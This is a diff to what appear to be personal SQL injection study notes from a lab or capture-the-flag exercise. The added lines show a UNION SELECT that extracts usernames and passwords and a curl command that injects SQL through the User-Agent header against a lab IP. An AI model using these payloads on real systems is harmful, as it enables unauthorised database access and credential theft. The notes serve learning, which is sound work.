@@ -39,3 +39,9 @@ SELECT * FROM books WHERE book_name = 'Intro to PHP' 1=1'
 if you can get any feedback from the SQL server, it usually means you are doing something right.
 
 Sometimes, going into burp and editing the request and then getting burp to return it (do intercept, response to this request) can return some decent SQL feedback.
+
+UNION SELECT username, password FROM user;
+plural selection of 2 different tables
+
+curl -H "User-Agent: ' UNION SELECT flag, book_id FROM books; # " http://10.10.86.73/httpagent/
+example of using header injection in a union select
